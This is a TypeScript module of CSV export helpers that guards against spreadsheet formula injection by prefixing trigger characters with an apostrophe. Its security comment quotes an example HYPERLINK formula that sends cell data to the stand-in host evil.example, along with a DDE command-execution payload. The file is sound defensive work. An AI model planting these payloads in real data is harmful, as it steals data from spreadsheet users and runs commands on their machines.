// Pure CSV helpers - no "server-only" and no other project imports, so
// this module (unlike almost everything else in lib/app-domain/) can be
// unit-tested in any sandbox regardless of database/network reachability.
// Used by app/api/reports/export/route.ts (spec 14.4: "CSV חובה").

// Security review (OWASP A03:2021 - Injection; CWE-1236, "CSV Formula
// Injection" / "Improper Neutralization of Formula Elements").
//
// Every export this project produces is fed by free text that a user
// typed: Client.name, Task.title, TimeEntry.note, Category.name,
// AuditEvent.action. Excel, LibreOffice Calc and Google Sheets all treat
// a cell whose first character is =, +, - or @ as a FORMULA rather than
// text. So a client named
//
//     =HYPERLINK("https://evil.example/?d="&A1,"Click for report")
//
// becomes a live, clickable exfiltration link in the spreadsheet Ariel or
// a client opens - and in older/misconfigured Excel, DDE payloads of the
// form =cmd|'/c calc'!A0 can reach command execution on the opener's
// machine. The attacker never touches the victim's browser; the payload
// travels through the export file, which is exactly why a web-layer XSS
// defense does not cover it.
//
// The neutralization below is the OWASP-recommended one: prefix a single
// apostrophe. Spreadsheet software then renders the cell as literal text
// and the apostrophe itself is not displayed, so a legitimate value
// starting with "-" (a negative number typed into a note) still READS
// correctly to a human - it just stops being executable.
//
// Two deliberate carve-outs:
//   - Actual numbers (typeof value === "number") are never touched. Every
//     numeric column in these exports is computed server-side from the
//     database, never from user text, and quoting them would break the
//     sums a client runs on the file.
//   - Tab and carriage return are included in the trigger set because
//     Excel strips leading whitespace before deciding whether a cell is a
//     formula, so "\t=1+1" is evaluated exactly like "=1+1".
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/// Neutralizes spreadsheet formula injection in a single value. Exported
/// so lib/xlsx.ts can apply the identical rule - XLSX cells are just as
/// formula-sensitive as CSV cells, and having one implementation means
/// the two export formats cannot drift apart.
export function neutralizeFormula(value: string | number): string | number {
  if (typeof value === "number") return value;
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

/// Minimal RFC 4180 field escaping - quotes a field only when it contains
/// a comma, quote, or newline, doubling any embedded quotes. Formula
/// neutralization runs first, so a value that only becomes dangerous
/// after unquoting still cannot be evaluated.
export function csvField(value: string | number): string {
  const s = String(neutralizeFormula(value));
  if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

/// Builds a full CSV document (header row + data rows) with a leading
/// UTF-8 BOM so Hebrew text opens correctly in Excel - spec 14.4's
/// explicit requirement ("עברית חייבת להישאר קריאה, כולל UTF-8 BOM
/// ב-CSV אם נדרש ל-Excel"). Uses CRLF line endings per RFC 4180.
export function toCsv(headers: string[], rows: (string | number)[][]): string {
  const lines = [headers.map(csvField).join(","), ...rows.map((row) => row.map(csvField).join(","))];
  return "﻿" + lines.join("\r\n");
}
